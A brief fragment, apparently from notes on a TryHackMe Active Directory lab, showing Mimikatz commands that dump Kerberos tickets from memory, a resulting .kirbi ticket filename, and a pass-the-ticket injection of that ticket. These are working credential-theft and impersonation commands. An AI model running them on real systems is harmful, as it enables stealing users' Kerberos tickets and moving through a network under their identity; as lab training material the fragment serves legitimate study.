
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
``````
```

[0;222d30]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi 


```shell-session
mimikatz # kerberos::ptt [0;222d30]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi
